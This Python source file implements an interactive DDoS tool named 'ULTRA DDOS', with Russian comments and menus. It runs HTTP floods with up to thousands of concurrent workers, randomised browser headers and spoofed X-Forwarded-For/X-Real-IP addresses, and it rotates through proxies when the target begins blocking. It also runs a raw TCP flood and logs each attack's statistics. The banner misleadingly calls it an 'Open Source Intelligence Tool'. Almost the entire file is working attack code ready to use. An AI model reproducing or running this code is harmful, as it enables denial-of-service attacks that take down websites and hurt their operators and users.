import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
from datetime import datetime

# ================= WINDOWS CONSOLE FIXES =================
if os.name == "nt":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    try:
        os.system("")
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        try:
            import colorama
            colorama.init()
        except ImportError:
            pass

# ================= ЦВЕТА (неоново-розовый / фиолетовый) =================
RESET = "\033[0m"

def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

PINK = rgb(255, 30, 220)
PINK_MID = rgb(200, 20, 180)
PINK_DARK = rgb(150, 10, 130)
CYAN = rgb(80, 230, 230)
GREEN = rgb(0, 255, 100)
RED = rgb(255, 50, 50)
YELLOW = rgb(255, 220, 0)
WHITE = rgb(255, 255, 255)
GRAY = rgb(150, 150, 150)
BLOCK = "\u2588"

g = "\033[1;32m"
r = "\033[1;31m"
w = "\033[0m"
b = "\033[1;34m"
o = "\033[1;33m"

# ================= БАННЕР ULTRA DDOS (неоново-розовый) =================
FONT = {
    'U': ["#   #", "#   #", "#   #", "#   #", "#   #", " ### "],
    'L': ["#    ", "#    ", "#    ", "#    ", "#    ", "#####"],
    'T': ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "  #  "],
    'R': ["#### ", "#   #", "#   #", "#### ", "# #  ", "#  ##"],
    'A': [" ### ", "#   #", "#   #", "#####", "#   #", "#   #"],
    'D': ["#### ", "#   #", "#   #", "#   #", "#   #", "#### "],
    'O': [" ### ", "#   #", "#   #", "#   #", "#   #", " ### "],
    'S': [" ####", "#    ", " ### ", "    #", "    #", "#### "],
}

WORD = "ULTRA DDOS"
LETTER_H = 6
GAP = 1

def render_solid_rows(word):
    rows = ["" for _ in range(LETTER_H)]
    for ch in word:
        if ch == ' ':
            for i in range(LETTER_H):
                rows[i] += " " * 6 + " " * GAP
            continue
        glyph = FONT.get(ch, ["      "] * LETTER_H)
        for i in range(LETTER_H):
            rows[i] += glyph[i] + " " * GAP
    return rows

def colorize_solid(rows):
    out = []
    for row in rows:
        line = "".join(
            f"{PINK}{BLOCK}{RESET}" if c == "#" else " "
            for c in row
        )
        out.append(line)
    return out

def animate_banner():
    os.system("cls" if os.name == "nt" else "clear")
    
    solid_rows_raw = render_solid_rows(WORD)
    colored_rows = colorize_solid(solid_rows_raw)
    
    # Показываем буквы одну за другой
    for step in range(1, len(WORD.replace(" ", "")) + 1):
        os.system("cls" if os.name == "nt" else "clear")
        
        # Берём только первые step букв (игнорируем пробелы для подсчёта)
        partial_word = ""
        count = 0
        for ch in WORD:
            if ch == ' ':
                partial_word += ' '
            else:
                if count < step:
                    partial_word += ch
                    count += 1
                else:
                    partial_word += ' '
        
        partial_rows = render_solid_rows(partial_word)
        partial_colored = colorize_solid(partial_rows)
        
        print()
        for line in partial_colored:
            print(line)
        
        if step == len(WORD.replace(" ", "")):
            print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{CYAN}║{PINK}     v5.0 Pydroid {PINK_MID}|{PINK} by @jecrs {PINK_MID}|{PINK} verificator{RESET}{CYAN}          ║{RESET}")
            print(f"{CYAN}║{PINK}     Open Source Intelligence Tool{RESET}{CYAN}                        ║{RESET}")
            print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
            print()
        
        time.sleep(0.07)
    
    time.sleep(0.3)

def banner():
    animate_banner()

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "save_results": True,
    "check_private_ip": False,
    "proxy_rotation_interval": 10,
    "socks5_support": True
}

# ================= СТАТИСТИКА =================
def load_total_stats():
    try:
        with open('total_stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"total_attacks": 0, "total_requests": 0, "total_success": 0, "total_errors": 0}

def save_total_stats(stats):
    try:
        with open('total_stats.json', 'w') as f:
            json.dump(stats, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            hist = json.load(f)
    except:
        hist = []
    hist.append(entry)
    if len(hist) > 100:
        hist = hist[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(hist, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= ПРОВЕРКА ПРОКСИ =================
async def check_proxy(proxy):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy) as resp:
                return resp.status == 200
    except:
        return False

# ================= TCP ФЛУД =================
async def tcp_flood(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(CONFIG["timeout"])
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\n\r\n" * 20)
        sock.close()
        return True
    except:
        return False

# ================= КЛАСС АТАКИ =================
class Attack:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.current_proxy_index = 0
        self._lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            return len(self.proxies)
        except:
            return 0

    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy

    async def http_flood(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.get_next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36'
                ]),
                'Accept': random.choice([
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'application/json,text/plain,*/*',
                    '*/*'
                ]),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': random.choice([
                    'en-US,en;q=0.9',
                    'ru-RU,ru;q=0.8,en-US;q=0.6',
                    'uk-UA,uk;q=0.9,en;q=0.8'
                ]),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': random.choice(['document', 'empty']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
                'Sec-Fetch-Site': 'none',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.current_proxy_index = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False, allow_redirects=True) as resp:
                body = await resp.read()
                async with self._lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 303, 307, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503, 504]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except asyncio.TimeoutError:
            async with self._lock:
                self.requests += 1
                self.errors += 1
        except aiohttp.ClientError:
            async with self._lock:
                self.requests += 1
                self.errors += 1
        except Exception:
            async with self._lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    await self.http_flood(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    if await tcp_flood(ip, port):
                        async with self._lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self._lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= INFO =================
def show_info():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""{PINK}
╔══════════════════════════════════════════════════════════════════╗
║                      📖 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ            ║
╠══════════════════════════════════════════════════════════════════╣
║                                                               ║
║  {WHITE}1. DDOS IP ADDRESS{RESET}{PINK}                                      ║
║     Запускает HTTP/HTTPS флуд по указанному IP-адресу.       ║
║                                                               ║
║  {WHITE}2. VIEW URL IP ADDRESS{RESET}{PINK}                                  ║
║     Запускает TCP-флуд по указанному URL.                    ║
║                                                               ║
║  {WHITE}3. DDOS SITE LOGS{RESET}{PINK}                                      ║
║     Показывает логи всех проведённых атак.                   ║
║                                                               ║
║  {WHITE}4. PROXY MANAGEMENT{RESET}{PINK}                                     ║
║     Добавление, удаление и проверка прокси-серверов.        ║
║                                                               ║
║  {WHITE}5. TOTAL STATISTICS{RESET}{PINK}                                     ║
║     Общая статистика по всем атакам.                        ║
║                                                               ║
║  {WHITE}6. HISTORY{RESET}{PINK}                                              ║
║     История последних 100 атак.                             ║
║                                                               ║
║  {WHITE}7. SETTINGS{RESET}{PINK}                                             ║
║     Настройка потоков, таймаута и ротации прокси.           ║
║                                                               ║
║  {WHITE}8. INFO{RESET}{PINK}                                                ║
║     Показать это руководство.                                ║
║                                                               ║
║  {WHITE}99. EXIT{RESET}{PINK}                                               ║
║     Выход из программы.                                      ║
║                                                               ║
╚══════════════════════════════════════════════════════════════════╝
{RESET}""")
    input(f"{PINK}Нажми ENTER для возврата в меню...{RESET}")

# ================= DDOS IP =================
def ddos_ip():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                      DDOS IP ADDRESS                           ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Type: HTTP/HTTPS Flood                                        ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")

    url = input(f"{PINK}Target IP: {WHITE}")
    if not url.startswith('http'):
        url = 'http://' + url

    threads = input(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}")
    threads = max(1, min(CONFIG["max_threads"], int(threads) if threads.isdigit() else 100))

    print(f"\n{PINK}Launching attack on {WHITE}{url}{PINK} with {WHITE}{threads}{PINK} threads...{RESET}")
    time.sleep(1)
    asyncio.run(run_attack_http(url, threads))

# ================= VIEW URL IP =================
def view_url_ip():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                     VIEW URL IP ADDRESS                         ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Type: TCP Flood                                                ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")

    url = input(f"{PINK}Target URL: {WHITE}")
    if not url.startswith('http'):
        url = 'http://' + url

    threads = input(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}")
    threads = max(1, min(CONFIG["max_threads"], int(threads) if threads.isdigit() else 100))

    print(f"\n{PINK}Launching attack on {WHITE}{url}{PINK} with {WHITE}{threads}{PINK} threads...{RESET}")
    time.sleep(1)
    asyncio.run(run_attack_tcp(url, threads))

# ================= DDOS SITE LOGS =================
def ddos_site_logs():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                         DDOS SITE LOGS                          ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Logs viewer                                                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")

    print(f"\n{PINK}System logs:{RESET}")
    stats = load_total_stats()
    print(f"{PINK}Total Attacks: {WHITE}{stats['total_attacks']}")
    print(f"{PINK}Total Requests: {WHITE}{stats['total_requests']:,}")
    print(f"{PINK}Total Success: {WHITE}{stats['total_success']:,}")
    print(f"{PINK}Total Errors: {WHITE}{stats['total_errors']:,}")

    input(f"\n{PINK}Press ENTER to return...{RESET}")

# ================= ЗАПУСК АТАК =================
async def run_attack_http(url, threads):
    attack = Attack()
    task = asyncio.create_task(attack.start_http(url, threads))

    while attack.running:
        elapsed = int(time.time() - attack.start_time)
        rate = int(attack.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)

        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                        ATTACK IN PROGRESS                       ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Target : {WHITE}{url[:25]}{PINK}{' ' * (25 - len(url[:25]))}║")
        print(f"║ Threads: {WHITE}{threads}{PINK}{' ' * (25 - len(str(threads)))}║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
        print(f"║ Rate    : {WHITE}{rate:,} req/s{PINK}{' ' * (18 - len(str(rate)))}║")
        print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
        print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
        print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Load    : {WHITE}[{bar}] {load}%{PINK}{' ' * (10 - len(str(load)))}║")
        print(f"║ Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{PINK}{' ' * (18 - len(f'{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}'))}║")
        print(f"║ Data    : {WHITE}{attack.bytes_sent/1024/1024:.1f} MB{PINK}{' ' * (10 - len(f'{attack.bytes_sent/1024/1024:.1f} MB'))}║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"{PINK}[Press ENTER to stop]{RESET}")
        await asyncio.sleep(0.3)

    attack.stop()
    await task

    elapsed = int(time.time() - attack.start_time)
    entry = {
        "target": url,
        "threads": threads,
        "duration": elapsed,
        "requests": attack.requests,
        "success": attack.success,
        "errors": attack.errors,
        "banned": attack.banned,
        "bytes_sent": attack.bytes_sent,
        "avg_rate": int(attack.requests / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)

    stats = load_total_stats()
    stats["total_attacks"] += 1
    stats["total_requests"] += attack.requests
    stats["total_success"] += attack.success
    stats["total_errors"] += attack.errors
    save_total_stats(stats)

    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                         ATTACK FINISHED                          ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
    print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
    print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
    print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
    print(f"║ Duration: {WHITE}{elapsed} sec{PINK}{' ' * (18 - len(str(elapsed)))}║")
    print(f"║ Avg Rate: {WHITE}{int(attack.requests/elapsed) if elapsed>0 else 0} req/s{PINK}{' ' * (18 - len(str(int(attack.requests/elapsed) if elapsed>0 else 0)))}║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

async def run_attack_tcp(url, threads):
    attack = Attack()
    task = asyncio.create_task(attack.start_tcp(url, threads))

    while attack.running:
        elapsed = int(time.time() - attack.start_time)
        rate = int(attack.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)

        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                        ATTACK IN PROGRESS                       ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Target : {WHITE}{url[:25]}{PINK}{' ' * (25 - len(url[:25]))}║")
        print(f"║ Threads: {WHITE}{threads}{PINK}{' ' * (25 - len(str(threads)))}║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
        print(f"║ Rate    : {WHITE}{rate:,} req/s{PINK}{' ' * (18 - len(str(rate)))}║")
        print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
        print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
        print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║ Load    : {WHITE}[{bar}] {load}%{PINK}{' ' * (10 - len(str(load)))}║")
        print(f"║ Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{PINK}{' ' * (18 - len(f'{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}'))}║")
        print(f"║ Data    : {WHITE}{attack.bytes_sent/1024/1024:.1f} MB{PINK}{' ' * (10 - len(f'{attack.bytes_sent/1024/1024:.1f} MB'))}║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"{PINK}[Press ENTER to stop]{RESET}")
        await asyncio.sleep(0.3)

    attack.stop()
    await task

    elapsed = int(time.time() - attack.start_time)
    entry = {
        "target": url,
        "threads": threads,
        "duration": elapsed,
        "requests": attack.requests,
        "success": attack.success,
        "errors": attack.errors,
        "banned": attack.banned,
        "bytes_sent": attack.bytes_sent,
        "avg_rate": int(attack.requests / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)

    stats = load_total_stats()
    stats["total_attacks"] += 1
    stats["total_requests"] += attack.requests
    stats["total_success"] += attack.success
    stats["total_errors"] += attack.errors
    save_total_stats(stats)

    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                         ATTACK FINISHED                          ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
    print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
    print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
    print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
    print(f"║ Duration: {WHITE}{elapsed} sec{PINK}{' ' * (18 - len(str(elapsed)))}║")
    print(f"║ Avg Rate: {WHITE}{int(attack.requests/elapsed) if elapsed>0 else 0} req/s{PINK}{' ' * (18 - len(str(int(attack.requests/elapsed) if elapsed>0 else 0)))}║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= PROXY MANAGEMENT =================
def proxy_management():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except:
        proxies = []

    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                         PROXY MANAGEMENT                         ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ [1] Add proxy manually                                         ║")
    print(f"║ [2] Load from proxies.txt                                      ║")
    print(f"║ [3] Show list ({len(proxies)} proxies)                                 ║")
    print(f"║ [4] Clear list                                                 ║")
    print(f"║ [5] Check all proxies                                          ║")
    print(f"║ [99] Back                                                      ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")

    choice = input(f"{PINK}Select: {WHITE}")
    if choice == '1':
        proxy = input(f"{PINK}Enter proxy (http://ip:port or socks5://ip:port): {WHITE}")
        if proxy:
            with open('proxies.txt', 'a') as f:
                f.write(proxy + '\n')
            print(f"{PINK}✅ Proxy added{RESET}")
            time.sleep(1)
    elif choice == '2':
        try:
            with open('proxies.txt', 'r') as f:
                count = len([line for line in f if line.strip()])
            print(f"{PINK}✅ Loaded {WHITE}{count}{PINK} proxies{RESET}")
            time.sleep(1)
        except:
            print(f"{PINK}⚠ File not found{RESET}")
            time.sleep(1)
    elif choice == '3':
        if proxies:
            print(f"\n{PINK}List:{RESET}")
            for i, p in enumerate(proxies, 1):
                print(f"{PINK}{i}. {WHITE}{p}{RESET}")
        else:
            print(f"\n{PINK}⚠ Empty{RESET}")
        input(f"{PINK}Press ENTER...{RESET}")
    elif choice == '4':
        open('proxies.txt', 'w').close()
        print(f"{PINK}✅ List cleared{RESET}")
        time.sleep(1)
    elif choice == '5':
        print(f"{PINK}⏳ Checking proxies...{RESET}")
        async def check_all():
            valid = []
            for p in proxies:
                if await check_proxy(p):
                    valid.append(p)
            return valid
        if proxies:
            valid = asyncio.run(check_all())
            with open('proxies.txt', 'w') as f:
                f.write('\n'.join(valid))
            print(f"{PINK}✅ Working: {WHITE}{len(valid)}{PINK}/{WHITE}{len(proxies)}{RESET}")
            time.sleep(2)
    elif choice == '99':
        return
    proxy_management()

# ================= TOTAL STATISTICS =================
def total_statistics():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    stats = load_total_stats()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                         TOTAL STATISTICS                         ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ Total Attacks: {WHITE}{stats['total_attacks']}{PINK}{' ' * (15 - len(str(stats['total_attacks'])))}║")
    print(f"║ Total Requests: {WHITE}{stats['total_requests']:,}{PINK}{' ' * (14 - len(str(stats['total_requests'])))}║")
    print(f"║ Total Success : {WHITE}{stats['total_success']:,}{PINK}{' ' * (14 - len(str(stats['total_success'])))}║")
    print(f"║ Total Errors  : {WHITE}{stats['total_errors']:,}{PINK}{' ' * (14 - len(str(stats['total_errors'])))}║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= HISTORY =================
def history_view():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    hist = load_history()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                             HISTORY                              ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    if not hist:
        print(f"║ No records found{' ' * (22)}║")
    else:
        for i, entry in enumerate(hist[-10:], 1):
            target = entry.get('target', 'N/A')[:20]
            req = entry.get('requests', 0)
            ts = entry.get('timestamp', '')[:16]
            print(f"║ {WHITE}{i}. {PINK}{target}{' ' * (20 - len(target))} {WHITE}{req} req{PINK} ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= SETTINGS =================
def settings_menu():
    global CONFIG
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                             SETTINGS                             ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║ [1] Max Threads : {WHITE}{CONFIG['max_threads']}{PINK}{' ' * (15 - len(str(CONFIG['max_threads'])))}║")
    print(f"║ [2] Timeout     : {WHITE}{CONFIG['timeout']}s{PINK}{' ' * (15 - len(str(CONFIG['timeout'])))}║")
    print(f"║ [3] Max Duration: {WHITE}{CONFIG['max_duration']}s{PINK}{' ' * (15 - len(str(CONFIG['max_duration'])))}║")
    print(f"║ [4] Proxy Rot.  : {WHITE}{CONFIG['proxy_rotation_interval']}{PINK}{' ' * (15 - len(str(CONFIG['proxy_rotation_interval'])))}║")
    print(f"║ [99] Back                                                      ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")

    choice = input(f"{PINK}Select: {WHITE}")
    if choice == '1':
        val = input(f"{PINK}Max Threads (100-2000): {WHITE}")
        if val.isdigit():
            CONFIG['max_threads'] = max(100, min(2000, int(val)))
    elif choice == '2':
        val = input(f"{PINK}Timeout (0.5-10): {WHITE}")
        try:
            CONFIG['timeout'] = max(0.5, min(10.0, float(val)))
        except:
            pass
    elif choice == '3':
        val = input(f"{PINK}Max Duration seconds (0 = no limit): {WHITE}")
        if val.isdigit():
            CONFIG['max_duration'] = int(val)
    elif choice == '4':
        val = input(f"{PINK}Proxy rotation every N requests (5-100): {WHITE}")
        if val.isdigit():
            CONFIG['proxy_rotation_interval'] = max(5, min(100, int(val)))
    elif choice == '99':
        return
    settings_menu()

# ================= MAIN =================
def main():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"""{PINK}
╔══════════════════════════════════════════════════════════════════╗
║                          ГЛАВНОЕ МЕНЮ                          ║
╠══════════════════════════════════════════════════════════════════╣
║  {WHITE}1. {PINK}DDos Ip Address                                    ║
║  {WHITE}2. {PINK}View Url Ip Address                                 ║
║  {WHITE}3. {PINK}DDos site logs                                     ║
║  {WHITE}4. {PINK}Proxy Management                                   ║
║  {WHITE}5. {PINK}Total Statistics                                   ║
║  {WHITE}6. {PINK}History                                            ║
║  {WHITE}7. {PINK}Settings                                           ║
║  {WHITE}8. {PINK}INFO — инструкция по использованию                ║
║  {WHITE}99. {PINK}Exit                                              ║
╚══════════════════════════════════════════════════════════════════╝
{RESET}""")
        try:
            op = int(input(f"{PINK}Выбери опцию (0-99): {WHITE}"))
        except:
            print(f"{PINK}Invalid input. Reloading Tools!{RESET}")
            time.sleep(1.6)
            continue

        if op == 1:
            ddos_ip()
        elif op == 2:
            view_url_ip()
        elif op == 3:
            ddos_site_logs()
        elif op == 4:
            proxy_management()
        elif op == 5:
            total_statistics()
        elif op == 6:
            history_view()
        elif op == 7:
            settings_menu()
        elif op == 8:
            show_info()
        elif op == 99:
            os.system("cls" if os.name == "nt" else "clear")
            print(f"{PINK}Exiting...{RESET}")
            sys.exit()
        else:
            print(f"{PINK}Invalid input. Reloading Tools!{RESET}")
            time.sleep(1.6)

if __name__ == "__main__":
    main()
